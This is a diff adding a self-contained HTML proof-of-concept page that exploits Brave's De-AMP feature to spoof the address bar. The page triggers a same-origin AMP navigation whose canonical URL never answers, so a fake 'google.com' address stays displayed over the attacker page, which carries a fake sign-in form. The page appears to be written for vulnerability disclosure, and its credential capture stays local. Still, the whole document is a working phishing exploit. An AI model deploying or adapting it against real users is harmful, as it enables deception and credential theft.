@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>De-AMP Omnibox Spoof PoC</title>
+  <style>
+    body { font-family: system-ui, sans-serif; margin: 0; }
+    #attacker-banner {
+      background: #c0392b; color: #fff; font-weight: 700;
+      padding: 14px 18px; font-size: 15px;
+    }
+    .wrap { padding: 20px; max-width: 640px; }
+    code { background: rgba(127,127,127,0.18); padding: 1px 5px; border-radius: 4px; }
+    .tick { font-variant-numeric: tabular-nums; font-weight: 700; }
+    form { margin-top: 16px; display: grid; gap: 10px; max-width: 320px; }
+    input { padding: 8px 10px; font-size: 14px; }
+    button { padding: 9px 12px; font-size: 14px; cursor: pointer; }
+    #captured {
+      margin-top: 18px; padding: 12px 14px; background: #fff6c2;
+      border: 1px solid #e0c200; border-radius: 6px; display: none;
+      white-space: pre-wrap; font-family: ui-monospace, monospace; font-size: 13px;
+    }
+    ol { line-height: 1.6; }
+  </style>
+</head>
+<body>
+  <div id="attacker-banner">
+    THIS PAGE IS 127.0.0.1 &mdash; THE ATTACKER. The address bar is lying.
+  </div>
+
+  <div class="wrap">
+    <h1>De-AMP omnibox spoof</h1>
+
+    <p>This document is served by the attacker origin
+    (<code id="origin"></code>). It never navigates away. When you press
+    <b>Start</b> it triggers De-AMP, and the address bar will change to
+    <code id="spoofed-label"></code> while this red page stays on screen and the
+    counter below keeps running.</p>
+
+    <p>Live tick since attacker page loaded:
+    <span class="tick" id="tick">0</span></p>
+
+    <p><button id="start">Start (trigger De-AMP)</button></p>
+
+    <h2>What happens</h2>
+    <ol>
+      <li>This page commits and starts counting.</li>
+      <li>It sets <code>location.href = 'amp.html'</code> (same-origin, always allowed).</li>
+      <li><code>amp.html</code> is an AMP document whose
+      <code>&lt;link rel="canonical"&gt;</code> points at a dropped-SYN endpoint.</li>
+      <li>Brave's De-AMP cancels <code>amp.html</code> and re-issues a
+      <b>browser-initiated</b> navigation to the canonical URL.</li>
+      <li>The endpoint never answers, so the navigation stays <b>pending</b> and
+      the spoofed URL stays in the omnibox over this still-rendered page.</li>
+    </ol>
+
+    <h2>Fake sign-in (captures locally, sends nothing)</h2>
+    <form id="signin">
+      <input id="user" type="text" placeholder="username" autocomplete="username">
+      <input id="pass" type="password" placeholder="password" autocomplete="current-password">
+      <button type="submit">Sign in</button>
+    </form>
+    <div id="captured"></div>
+  </div>
+
+  <script>
+    // The URL we expect to appear (spoofed) in the omnibox. This MUST match the
+    // <link rel="canonical"> href in amp.html. Change both together.
+    const SPOOFED = 'https://google.com:444/';
+
+    document.getElementById('origin').textContent = location.origin;
+    document.getElementById('spoofed-label').textContent = SPOOFED;
+
+    // Tick counter proves this page keeps running while the omnibox is spoofed.
+    let t = 0;
+    const tickEl = document.getElementById('tick');
+    setInterval(() => { tickEl.textContent = ++t; }, 100);
+
+    // Local-only credential capture. Nothing leaves the page.
+    document.getElementById('signin').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const box = document.getElementById('captured');
+      box.style.display = 'block';
+      box.textContent =
+        'Attacker captured (locally, not transmitted):\n' +
+        'username: ' + document.getElementById('user').value + '\n' +
+        'password: ' + document.getElementById('pass').value;
+    });
+
+    // Trigger De-AMP on demand. amp.html is same-origin, so this navigation is
+    // always allowed; De-AMP then cancels it and re-issues a browser-initiated
+    // navigation to the (dropped-SYN) canonical URL.
+    document.getElementById('start').addEventListener('click', () => {
+      location.href = 'amp.html';
+    });
+  </script>
+</body>
+</html>
